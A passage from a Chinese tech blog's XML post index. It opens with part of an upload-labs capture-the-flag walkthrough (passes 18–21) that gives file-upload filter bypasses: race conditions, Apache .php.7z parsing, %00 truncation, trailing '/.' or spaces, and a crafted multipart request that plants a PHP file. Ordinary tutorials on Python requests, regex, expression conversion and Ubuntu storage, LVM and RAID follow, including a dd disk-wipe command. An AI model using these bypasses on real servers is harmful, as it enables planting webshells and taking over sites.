"\r") pool = ThreadPool(10) pool.map(upload, range(10000)) pool.close() pool.join() 只是把burp换成了python，其他操作方法是一样的 修复问题应该先判断文件类型，再移动 Pass - 19if( $this->cls_rename_file == 1 ){ //是否用$im_path成功给$upload_file重命名 和第18关有点类似，都对关键进行了重命名，由于我们是利用burp不断的发送相同的包，那么一旦有两个包同时传到这边是，那么系统对一个重命名时，另一个刚好“逃脱”了，那么上传成功。 绕过在这关是一个白名单，利用了appche的一个解析漏洞，它会将 “.php.7z 当作.php来解析，而刚好 “ .php.7z ”又属于白名单， 所以上传一个 “ .php.7z ” 的文件，然后 再利用条件竞争漏洞进行多线程不断的发送 “ .php.7z”的文件， 由于版本问题，这次的文件没有上传到upload的文件夹下面，而是上传到 WWW 的文件夹下面，但是不影响，并且这次的文件上传后就不会被删掉，就会保存在 该文件夹下面，这样的话我们将可以稳定的访问到。 可以看到，burp进行多线程发包后，在浏览器一致访问上传文件的地址，一定会有那么一瞬间会访问到（这时，文件里新建webshell的代码执行了，新的后门建立成功了，我们就可以访问后门了） 00截断和move_uploaded_file（）函数Pass - 20pathinfo(）函数：以数组的形式返回关于文件路径的信息。 pathinfo(path,options) move_uploaded_file(A,B)函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。 绕过方法一： %00截断 （前面已经写了） 111.php%00upload-19.jpg 其中，%00是url-decode之后的 方法二： 利用move_uploaded_file（）函数和黑名单结合存在的漏洞： move_uploaded_file（A,B）函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。 由于这里利用了黑名单，则move_uploaded_file（）函数在判断时只会判断是否为黑名单，如果不是，那么他将会直接将文件保存在指定目录下。所以在这里我们利用 /.(斜杠点)和 空格（空格）进行绕过。 （1） “/.”(斜杠点) ​ upload-19.php/. （2）“ ”（空格） ​ upload-19.php ​ （3）“ .”（空格） upload-19.php. upload-19.php. 点+空格 等等… 方法三： Windows冒号截断 upload-19.php:.jpg (我做的实验，php上传成功，但是内容清空了) Pass - 21 参考: https://blog.csdn.net/kekefen01/article/details/90346413 通过传递数组绕过。属于逻辑漏洞，没有考虑数组第二个元素不存在的情况。 绕过使用多个数组 ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="upload_file"; filename="info.php" Content-Type: image/jpeg &lt;?php phpinfo();?&gt; ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="save_name[0]" info.php/ ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="save_name[2]" jpg ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="submit" 上传 ------WebKitFormBoundaryDTdqZdRoon2GpWOE-- 最终文件名为“info.php/.” 因为move_uploaded_file底层会调用tsrm_realpath函数导致，递归删除文件名最后的/. 参考文章：https://blog.csdn.net/weixin_43901038/article/details/94890631 https://www.cnblogs.com/shellr00t/p/6426945.html https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python之requests库]]></title>
    <url>%2Fposts%2F659559f6%2F</url>
    <content type="text"><![CDATA[Requests是基于urllib3来改写的，采用Apache2 Licensed 来源协议的HTTP库。 它比urllib更加方便，可以节约我们大量的工作，完全满足HTTP测试需求。 安装pip install requests 使用测试网站：http://httpbin.org/ GET请求import requests # 不带参数 r = requests.get('http://httpbin.org/get') print(r.text) # 携带参数 data = { 'name':'zhangsan', 'age':20, } r1 = requests.get('http://httpbin.org/get', params=data) r3.encoding = 'utf-8' # 设置编码 print(r1.text) #如果是中文或者有其他特殊符号，则进行url编码 from urllib.parse import urlencode job = "程序员" parm = urlencode(job, encoding="utf-8") # 再进行拼接后进行后续请求... POST请求import requests # 不带参数 r = requests.post('http://httpbin.org/post') print(r.text) # 携带参数 data = { 'user': 1, 'pwd': 'hhh', 'submit': 'submit', } r1 = requests.post('http://httpbin.org/post', data=data) 请求头 # 自定义请求头 headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36', } response1 = requests.get(url, headers=headers,params=data) # 打印请求头 print(response1.request.headers) # 两种遍历方式 for key, value in r3.headers.items(): print(key+":"+value) print("************************************") for key in r3.headers: # 不是请求头 print(key + ":" + (r3.headers)[key]) 响应信息# 响应头 print(response1.headers) # 其他信息 print(response1.headers['Server']) print(response1.url) # 打印url print(response1.status_code) # 状态码 200 print(response1.cookies.items()) # cookie print(response1.apparent_encoding) # 提供的编码 print(response1.elapsed) # 请求到响应的时间 print(r.history) # history属性得到请求历史 # cookie操作 print(response1.headers['Set-Cookie']) print(response.text) # 响应返回的数据: str print(response.content) # 响应返回的数据: 二进制形式 # 对文件内容查找(比如被安全狗拦截后页面中会有关键字:`safedog`) ... if response.text.find('safedor'): print('被拦截') else: print('绕过') ... # 比如爬图片，音乐，视频就是用的二进制数据 import requests response = requests.get('http://xpshuai.cn/favicon.ico') # 保存图片 wb写入 with open('favicon.ico','wb')as f: f.write(response.content) 解析json使用json（）方法，就可以将返回结果是JSON格式的字符串转化为字典 import requests r = requests.get('http://httpbin.org/get') print(r.text) print(type(r.text)) # &lt;class 'str'> print(r.json()) print(type(r.json())) # &lt;class 'dict'> SSL证书检验# 参数 verify=False时表示，对于 https 不验证证书 r = requests.get(url1, verify=False) 设置代理import requests proxies = {'http': ' http://127.0.0.1:8080', 'https': ' https://127.0.0.1:8080'} r = requests.get(url, proxies=proxies, verify=False) 可以设置代理池, 随机更换 proxies = [] request = requests.get(url, proxies={'http': random.choice(proxies)}, headers=head) 自定义cookie#打印cookie for key,value in r.cookies.items(): print(key + '=' + value) 1.简单的做法: import requests headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/" "537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" } cookies = {"cookie_name": "cookie_value", } response = requests.get(url, headers=headers, cookies=cookies) 2.CookieJar 更专业的方式:先实例化一个RequestCookieJar的类，然后把值set进去，最后在get,post方法里面指定cookies参数 from http.cookiejar import CookieJar requests.cookies.update() c = requests.cookies.RequestsCookieJar() c.set('cookie-name', 'cookie-value', path='/', domain='.abc.com') s.cookies.update(c) 3.requests.Session()方法 session = requests.Session() session.cookies['cookie'] = 'cookie-value' # 功能：可以添加cookie，不会清除原cookie # 缺点：不能设置path，domain等参数 session会话维持 在requests中，如果直接利用get（）或post（）等方法的确可以做到模拟网页的请求，但是这实际上是相当于不同的会话，也就是说相当于你用了两个浏览器打开了不同的页面。 import requests headers = { "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "User-Agent" : "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.6) ", } #设置一个会话session对象s s = requests.session() resp = s.get('https://www.baidu.com/s?wd=python', headers=headers) # 打印请求头和cookies print(resp.request.headers) print(resp.cookies) # 利用s再访问一次 resp = s.get('https://www.baidu.com/s?wd=python', headers=headers) # 请求头已`保持`首次请求后产生的cookie print(resp.request.headers) 异常处理进行网络请求的时候，难免会出错，这时候为了程序能够继续运行下去，就要对异常进行处理 # 最简单的一种 try: # 请求过程 r = requests.get(url1, headers=headers, verify=False, params=data, cookies=cookies) # ...... except Exception as e: time.sleep(1) print(e) finally: print("程序执行结束!") 文件上传import requests files = { 'file':open('favicon.ico','rb') } r = requests.post('http://www.httpbin.org/post',files=files) print(r.text) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python正则表达式]]></title>
    <url>%2Fposts%2F6bab798e%2F</url>
    <content type="text"><![CDATA[常用正则表达式来对爬取的网页进行解析，但是正则表达式的构造稍微复杂一点，一般在结构化的网页中没必要用正则（易出错） # findall a = re.findall('jianeng',s ) ## 搜索字符串，以列表类型返回全部能匹配的子串 print(a) #search() # 在一个字符串中搜索，匹配正则表达式的第一个位置，返回match对象 &lt;_sre.SRE_Match object; span=(1, 8), match='jianeng'> 只能找到第一次出现的 a = re.search('jianeng',s) print(a) #finditer() # 搜索字符串，返回一个匹配结果的迭代类型， # 每个迭代元素是match对象 s = 'sjianengsdfasjianeng15sadfjianeng666' finditer = re.finditer('jianeng',s) print(finditer ) ##获取match对象中的值 for i in finditer: print(i) print(i.group()) #froup() 返回匹配到的字符串 print(i.start() ) #返回匹配的开始位置 print(i.end() ) #返回匹配的结束位置 print(i.span() ) # 返回一个元组表示匹配位置（开始，结束） #sub() # 替换 类似于字符串中 replace() 方法 s2 = re.sub('jianeng','666',s,count=2) print(s2) # compile() # 编译正则表达式为模式对象 a = re.compile('jianeng') # a 要匹配jianeng dd='fsadfasfjkjianeng' b = a.findall(dd) print(b ) #re.split() # 将一个字符串按照正则表达式匹配结果进行分割，返回列表类型 c = re.split('jianeng',s,maxsplit=2) print(c) import re #####元字符 ##通配符 -> . 点 -> 表示任意一个字符 res = re.findall(r'a','abcad') #统一使用r取消转义 去右边字符串中找所有满足左边格式的子字符串 print(res) #['a', 'a'] res = re.findall(r'a..','abcad') print(res) #['abc'] ##锚点元字符 # ^ 锁定行首 res = re.findall(r'^a.','abcad') print(res) #['ab'] # $ 锁定行尾 res = re.findall(r'a.$','abcad') print(res) # ['ad'] ##单词边界(不是元字符)： \b res = re.findall(r'dog','Just dog Monica doggie Irene') print(res) # ['dog', 'dog'] #第二个dog不是单独的dog单词 res = re.findall(r'\bdog\b','Just dog Monica doggie Irene') print(res) # ['dog'] ###重复元字符 ####贪婪 （尽可能匹配的多） res = re.findall(r'ab{4}c','abbbbc') #连续4个b 把花括号前面紧挨着的重复多少次 print(res) #['abbbbc'] res = re.findall(r'ab{2,4}c','abbbc') #匹配2到4个b #正则不许加空格 print(res) #['abbbc'] res = re.findall(r'ab{2,}c','abbbbbbbbbc') #匹配2的到多个，至少2个 print(res) #['abbbbbbbbbc'] ### res = re.findall(r'ab*c','abbbc') # * 任意多个重复, 相当于{0,} print(res) res = re.findall(r'ab+c','abbbc') # * 一个或多个，一到正无穷,相当于 {1,} print(res) res = re.findall(r'ab?c','abbbc') # * 一个或者没有 ,相当于 {0,1} print(res) ######非贪婪 (尽可能匹配的少) 后面加一个 ？ res = re.findall(r'ab*','abbc') # 这是贪婪 print(res) #['abb'] res = re.findall(r'ab*？','abbc') print(res) # 这是非贪婪 # *? #任意多个 # +? #一个或多个 # ?? #一个或没有 ###选择元字符 | res = re.findall(r'ab|bc','abc-adc-aec-bca') #二选一 # | 或 print(res) # ['ab', 'bc'] #选的是正则表达式 res = re.findall(r'a[bd]c','abc-adc-aec-bca') # 多选一 ， [] 方括号 表示你想要列举的所有情况，但是,仅仅一个字符 print(res) # ['abc', 'adc'] #选的是方括号里面的一个字符 ， 【】里面的逗号表示匹配逗号 res = re.findall(r'a[^bd]c','abc-adc-aec-bca') # ^在[]里面的话，放在第一位，表示反向 print(res) # 除了b和d res = re.findall(r'a[a-e]c','abc-adc-aec-bca-a^c') #用 - 连接表示范围 [a-zA-Z0-9_]任意字母数字下划线 print(res) ####转义元字符 匹配字符本身 \ 反斜杠 res = re.findall(r'.+.','1+2') print(res) #['1+2'] 不是匹配到了加号 res = re.findall(r'1\+2','1+2') #得到元字符的字面值 print(res) #['1+2'] ######预定义字符类 # \d #任一数字字符 -> [0-9] # \D #任一非数字字符 -> [^0-9] # \s #任一空白符 -> [\t\n\x0B\f\r] # \S #任一非空白符 -> [^\t\n\x0B\f\r] # \w #任一字母数字字符 -> [a-zA-Z0-9] # \W #任一非字母数字字符 -> [^a-zA-Z0-9] ######分组 res = re.findall(r'a(bc)+d','abcbcbcd') #只能匹配一个bc 括号里面的变成一个整体 一个括号就是一个组 print(res) # ['bc'] res = re.findall(r'(a(bc)+d)','abcbcbcd') #大组套小组 print(res) # [('abcbcbcd', 'bc')] res = re.findall(r'a(b|c)c','abc-acc-adc-aec') #与a[bc]c类似 print(res) # ['b', 'c'] ##按组提取数据 res = re.findall(r'(\w+)-(\w+)-(\w+)-(\w+)','abc-dc-acc-aaec') print(res) # [('abc', 'acc', 'adc', 'aec')] res = re.search(r'(?P&lt;year>\d+)-(?P&lt;month>\d+)-(?P&lt;day>\d+)','2018-03-13') print(res.groupdict()) # {'year': '2018', 'month': '03', 'day': '13'} """ 注意： 如果正则表达式中使用了括号， 那么findall函数匹配的结果 只会是括号中的内容， 而不是完整的匹配。 因此我们可以利用这种机制来 完整对需要部分的数据提取 """ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中缀表达式转换为后缀表达式]]></title>
    <url>%2Fposts%2F94a5b228%2F</url>
    <content type="text"><![CDATA[中缀表达式转换后缀表达式3.1 规则 1、初始化栈和集合：运算符号栈s1和存储空间集合s2 2、从左到右扫描中缀表达式 3、遇到操作数时，将其加入s2 4、遇到运算符时，比较其与s1栈顶运算符的优先级 - 4.1、如果s1为空，或栈顶运算符为左括号‘(’，则直接将此运算符入栈 - 4.2、否则，若优先级比栈顶运算符的高，也将运算符压入s1 - 4.3、否则，将s1栈顶的运算符弹出并加入到s2中，再次转到 流程4 5、遇到括号时： - 5.1、如果是左括号‘(’，则直接压入s1 - 5.2、如果是右括号‘)’，则依次弹出s1栈顶的运算符，并且加入s2，直到遇到左括号为止，此时将这一对括号丢弃 6、重复步骤 2-5，直到表达式的最右边 7、将s1中剩余的运算符依次弹出并加入s2 8、s2结果即为中缀表达式对应的后缀表达式 3.2 实例以上面的转换为实例，比如输入 1 + ( ( 2 + 3 ) * 4 ) - 5，那么怎么转换成后缀表达式呢？ 扫描到的元素 s2集合中元素 s1(栈底-&gt;栈顶) 说明 1 1 空 数字 直接加入到集合中 + 1 + s1为空，直接入栈 ( 1 +( 左括号 直接入栈 ( 1 +( ( 同上 2 12 +( ( 数字 + 12 +( (+ s1栈顶是左括号，运算符直接入栈 3 123 +( (+ 数字 ) 123+ +( 右括号，弹出运算符直至遇到左括号 * 123+ +( * s1栈顶是左括号，运算符直接入栈 4 123+4 +( * 数字 ) 123+4 * + 右括号，弹出运算符直至遇到左括号 - 123+4 *+ - -与+优先级相同，因此弹出+号，在压入- 5 123+4 *+ 5 - 数字 到达最右端 123+4 *+ 5 - 空 s1中剩余的运算符 至此整个过程转换完毕 即中缀表达式1 + ( ( 2 + 3 ) 4 ) - 5 的后缀表达式为1 2 3 + 4 + 5 - 非原创原文链接：https://blog.csdn.net/qq_36144258/article/details/95075064 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-存储管理]]></title>
    <url>%2Fposts%2F3c80c560%2F</url>
    <content type="text"><![CDATA[基本篇 存储 对磁盘的所有操作都要小心小心再小心 磁盘是计算机中最主要的存储设备 传统磁盘分区与逻辑卷管理 事前合理规划很重要 对磁盘的所有操作都要小心小心再小心 磁盘空间管理 df 查看硬盘总体使用情况`bash df “””第一列： 文件系统第二列： 存储空间（多少数据块）第三列： 使用量第四列： 可用量第五列：使用率第六列：挂载点“”” df -h # 人性化的方式 df -i # 查看inodes使用量 - `du` 查看详细信息 &gt;是谁拿走了我的存储空间 ```bash du # 查看所有 du / # 查看根目录/目录下的文件大小 ''' 结合sudo权限 ''' '-h # 人类易于阅读方式' sudo du / -h '- s # 汇总' sudo du /* -hs # 显示汇总结果 '-c # 除了子文件和子目录之外，外加一个总和 ' sudo du /usr/* -hsc 第三方工具 ncdu （比较人性化的工具）`bash apt install ncdu # 安装 ncdu # 使用（可以方向键和回车进入返回从 查看）按住’t’ 先显示目录，再显示文件按住’g’ 显示百分比‘q’退出 # 添加硬盘 &gt;扩容 用vbox模拟添加硬盘：存储-&gt;SATA-&gt;添加硬盘 ###### 1.磁盘设备名称 `dmsg`命令查看设备日志 `/dev/`目录下面可以查看设备的名称 `ls /dev/sd` ###### 2.硬盘分区 ```bash ## 1. fdisk -m 帮助菜单（查看参数） # 查看所有硬盘设备和分区情况 sudo fdisk -l # 分区 sudo fdisk /dev/sdb # 进入向导 # 先创建分区表 O # dos， MBR分区（基本分区） 传统分区格式，最大四个(主)分区，2T容量限制 g # GPT 未来标准，128个分区，无容量限制，推荐使用 # 会生成一个16进制的guid # 再创建分区 n 输入数字编号（后门会递增） 第一个扇区在哪个位置【让扇区决定磁盘大小】 输入结束扇区（默认最后一个扇区） 【也可以直接输入100M这种方式】 # 再保存分区 w # 查看分区结果 sudo fdisk -l 3.文件系统格式化mkfs 命令 sudo mkfs.ext4 /dev/sdb1 sudo mkfs.xfs /dev/sdb2 Linux上常用的格式：ext4 （普通日常使用推荐）xfs （适用与超大空间比如100T, 多文件，数据库） 4. 挂载 绑定访问路径 一般两个挂载目录:/mnt/ 一般是硬盘等 （下面创建空的子目录再挂到子目录下）/media/ 一般习惯使用挂： u盘等移动存储 1.mount命令 (临时性的，重启之后失效) # sdb代表那块硬盘， sdb1代表那个分区 sudo mount /dev/sdb1 /mnt/storge/ # -t 声明格式 sudo mount /dev/sdb1 -t ext4 /mnt/storge/ # 卸载目录下面的设备（如果busy就先退出这个目录先不要使用） sudo umount /storage 自动挂载 /etc/fstab`bash ‘’’第一列：设备ID UUID， 唯一的标号/ 设备名也可以，推荐id第二列：挂载点 swap无需挂载(none)第三列：文件系统 ext4, swap…第四列：options （ 参数， error=remount-ro的意思是发生错误只读形式挂） 一般填写默认就行 defaults:rw,exec,auto,nouser.asynchronous（异步存储） nouser表示当前用户才可以第五列：dump （基本没用，写0不备份就行， 备份的时候才设置1） 一般写 0第六列：pass (FS错误时fsck是否检查错误，0不检查，1优先，2后查） 一般写 2 ‘’’实践：1.blkid 查看设备UUIDlsblk -fP 查看设备id 2.编辑文件 3.reboot或者mount -a #将/etc/fstab的所有内容重新加载 ------------------------------------------------- &gt;高级篇 # SWAP管理 &gt; 可能是你的救命稻草 - 关于swap的争论 - 需要/不需要 （Raspberry Pi） - 大小多少才合理（2-16G） - Swap分区，swap文件 - 理想状态下应该无事可做的swap - 大量的swap空间使用意味着服务器已疲于奔命 - free -m free -h 查看内存以及swap的 - 某些云主机默认没有swap ubuntu中，是swap文件 ###### Swap文件 /swapfile #创建文件 制定大小，位置 `sudo fallocate -l 8G /swapfile` #查看文件 `sudo xxd /swapfile` #格式成swap文件 (记下 UUID) `sudo mkswap /swapfile` #把权限调小 `sudo chmod 0600 /swapfile` #修改挂载文件 sudo vim /etv/fstab/ `/swapfile none swap sw 0 0` #关闭原来的swap `sudo swapoff -a` #开启 `sudo swapon -a` ###### Swap分区 1.新增加一块硬盘 （如果vox提示已经创建过了，打开目录，删除那个硬盘[不要误删主硬盘和快照]，和.pre文件； 编辑.vobx文件，把新增硬盘配置项删掉） `ls /dev/sd*` 2. 分区 `fdisk /dev/sdb` 3.新建主分区，`t`修改分区表类型为swap分区的格式 `82`，`w`保存退出 (L 列出所有支持的分区类型) 可以看到：`/dev/sdb`已经分出了`/dev/sdb1` 4. 格式化为swap sudo mkswap /dev/sdb1 5修改挂载文件 sudo vim /etv/fstab/ `UUID=xxxxxx none swap sw 0 0` 6.关闭原来的swap `sudo swapoff -a` #7.重新开启 `sudo swapon -a` 原有的swap就可以删除啦～～～ # LVM管理 &gt;一项值得感谢的技术 - 无须重启计算机灵活调整硬盘空间大小 - 硬盘分区太大浪费，太小无法满足业务发展需要 - 将传统的硬盘分区逻辑的组合为资源池，按需分配 - 概念 - Volumn Groups （卷组）（池化）： 把物理资源的变成逻辑的 - Physical Volumns (物理卷) - Logical Volumnes （基本分区、RAID）： 可以存储数据的逻辑的概念，VG一部分资源的分割 - 安装包 - sudo apt install lvm2 添加硬盘， 先创建PV, 再创建VG, 再创建LV **1.物理卷：** ```bash # 创建物理卷 sudo pvcreate /dev/sdb # 查看物理卷 sudo pvdisplay # 查看简略的摘要信息 sudo pvs 2.卷组： sudo vgvreate vg01 /dev/sdb # 可以一次性指定多个pv sudo vgextend vg01 /dev/sdc /dev/sdd # 查看概要信息 vgscan / vgs sudo vgs 3.逻辑卷 # 创建逻辑卷， -n 名称, -L 大小， 从哪个vg里面分割的 sudo lvcreate -n lv-database -L 1G vg01 # 查看简要信息 sudo lvdisplay sudo lvscan / lvs # 格式化，(fstab自动)挂载 sudo mkfs.ext4 /dev/vg01/lv-database sudo mount /dev/vg01/lv-database/ /mnt/lv-01 df -h # 灵活拓展的特性 sudo lvextend /dev/vg01/lv-01 -l 256 # 增加完毕后大大小 256 sudo lvextend /dev/vg01/lv-01 -l +256 # 带加号，又增加大小 256个块 sudo lvextend /dev/vg01/lv-01 -L +2G # 增加2G # VG FREE 谁的百分比 sudo lvextend /dev/vg01/lv-01 -l 50%VG # 拓展到vg的50% sudo lvextend /dev/vg01/lv-01 -l +50%VG # 再拓展vg的50% # 逻辑卷扩充了 df -h # 是文件系统的查看。 这之后还没有告诉文件系统 # 把逻辑卷的扩充告诉文件系统，就可以用啦 sudo resize2fs /dev/vg01/lv-01 逻辑卷缩小 umount /dev/vg01/lv-01 # 必须下线 e2fsck -f /dev/vg01/lv-01 # 检查文件系统 resize2fs /dev/vg01/lv-01 1G # 缩小文件系统 lvresize /dev/vg01/lv-01 -L 1G # 缩小逻辑卷 # 重新挂载查看 sudo mount /dev/vg01/lv-01 /mnt/lv-01/ 快照 故障时可回退 临时可回退机制，不可视为备份 (备份应该是异地备份) 本地保存，安全性无法保证 系统根目录使用快照可以用于测试补丁更新 测试完成合并并删除快照 创建快照等同创建一个新的LV（默认是空的） 初始不占空间，但文件发生修改时原块数据被拷贝 回退时将快照中原始数据覆盖当前快照已经被修改的 # 快照 -s 是快照lv， -L大小 sudo lvcreate -s -n s01 -L 2G vg01/lv-01 # 快照LV可以被直接挂在，用于恢复单个文件 # 恢复快照（恢复后快照被删除） --mergr 哪个快照 sudo lvconvet --merge vg01/s01 # 直接是不能恢复的，我们查看一下 sudo lvscan # 让他不是active才行 sudo umount /mnt/lv-01 # 退出当前目录，执行此命令卸载目录 sudo lvchange -an vg01/lv-01 # -n 让他不active sudo lvchange -ay vg01/lv-01 # -y 让他active sudo mount dev/vg01/lv-01 /mnt/lv-01 # 重新挂载 移动物理卷数据当磁盘性能或老旧等因素需要更换硬盘，提前转移数据# 后门是目标盘，前面 -n 是指定lv数据, -i 数值，每隔几秒显示一下运行状态sudo promove -n lv-01 /dev/sdb /dev/sdc -i 1sudo pvdislpay 从业务的角度来思考技术，不要做书呆子技术人员 RAID 高级管理 与LVM结合将达到完美 软RAID基于mdadm驱动实现软RAID并不比硬RAID差 sudo apt install mdadm sudo mdadm -C -v /dev/md0 -l1 -n2 /dev/sdb /dev/sdc -z100M -x1 /dev/sdd -C 创建 -v 详细信息 -l RAID类型（0，1，5，6，10） -n RAID盘数量 -z 从每个硬盘占用多少空间创建RAID -x Spare盘（备用盘）数量+盘名 # 约定俗成： 逻辑设备：以0结尾，物理设备以1结尾 常用管理命令： 查看raid盘的状况： cat /proc/mdstat （开机之后临时生成的）-r 删除物理硬盘（如果正常状态下是提示busy的， 可以-f设置失效, –re-add重新加入磁盘阵列）-A 手动出发数据同步 替换硬盘后安装Grub(系统启动盘)sudo grub-install /dev/md0 格式化和加载sudo mkfs.ext4 /dev/md0 链接 符号链接(软链接) 和 硬链接 ls -li （查看inode值） inode: 存放文件元数据的数据对象，表现为一个数值编号 创建硬链接（inode值是相同的， 给不同数据起了不同的名） ln fileS fileD ln log2013.log ln2013 目录不能创建硬链接 不能移动硬链接到不同分区（inode改变） 创建软链接 不共用inode ln -s fileS fileD （可以跨设备，可以给目录… , 相对路径和绝对路径， 建议源文件是绝对路径，目标链接是相对路径） 数据加密/磁盘加密 数据最值钱 清除所有数据： # 把磁盘所有字节数据全覆盖为0 sudo dd if=/dev/zero of=/dev/sdc 磁盘加密： # 安装软件包 sudo apt install cryptsetup # 加密分区（需提前分区 fdisk） （boot/引导分区是不能加密的） sudo cryptsetup luksFormat /dev/sdc1 # 打开加密分区（随意命名） sudo cryptsetup luksOpen /dev/sdc1 srypt1 # 格式化加密分区 sudo mkfs.ext4 /dev/mapper/crypt1 # 挂载在加密分区 sudo mount /dev/mapper/crypt1 /mnt/crypt1 # 更改所有者 sudo chown xps:xps /mnt/crypt1 # 关闭加密分区(先umount) sudo umount /mnt/crypt1 sudo cryptsetup:luksClose crypt1 不仅对硬盘有用， 也可以对U盘进行加密可以用cryptsetup对u盘加密，设置一个足够强度的密码， 也可以再格式化为ext4格式，让win用户不能直接打开 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-进程管理&打包压缩]]></title>
    <url>%2Fposts%2Fa6154cbb%2F</url>
    <content type="text"><![CDATA[进程管理ps信息： PID： 进程id TTY: 运行进程的终端设备 STAT： 进程状态(Sleep, Running) TIME： 该进程占用的cpu时间 COMMAND: 命令名称 参数： -x： 当前用户启动的所有进程 -ax： 所有用户启动的进程 -u： 进程详细信息 -aux: -w： 显示进程文件完整路径 -auxw: ps u PID ($$: 当前shell的进程id) ps -L pid号 # 查看当前进程下面的线程 ps fajx # 查看进程树 pstree # 更直观的进程树 # 结束进程 kill pid # 默认Term kill -STOP pid # 暂停进程 （杀病毒杀不掉的时候可以先stop） kill -CONT pid # 回复已暂停的进程 kill -KILL pid # kill -9 pid kill -l # 所有kill命令的信号 归档打包和压缩gzip (GUN Zip) gzip file1 gunzip file1.gz # Gzip不支持多文件/目录的归档打包 # 会干掉原始文件 tar打包归档 (Archive)tar cvf file2.tar file1 file2 file3 # 并不进行压缩 gzip file.tar # 可以打包之后再压缩 gunzip file.tar.gz # 先解压 tar xcvf file2.tar # 解包 # tar 结合gz tar zcvf file2.tar.gz file1 file2 file3 # 参数z 打包同事亚索 tar -ztvf file.tar.gz # -t 显示文件内容但是不解压 tar jcvf c.tar.bz2 a b # bz2 bzip2速度可能慢一点，但是对文本文件压缩更小 bzip2 f # 压缩 nunzip f.bz2 # tar 的 -j也可以 tar jcvf c.tar.bz2 a b sudoersudo用户组 cat /etc/group中sudo组，才能加sudo运行命令 处于安全的考虑 sudo visudo 文件/etc/sudoers 组 所有主机=() 系统的哪些命令 %sudo All=(ALL:ALL) ALL # 指定配置 user_alias ADMINS = user1, user2 # 指定一些用户的别名 ADMINS ALL = (ALL)NOPASSWD:ALL # 该别名的权限 root ALL=(ALL) ALL document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-帮助&输出与重定向]]></title>
    <url>%2Fposts%2Fdc8613b5%2F</url>
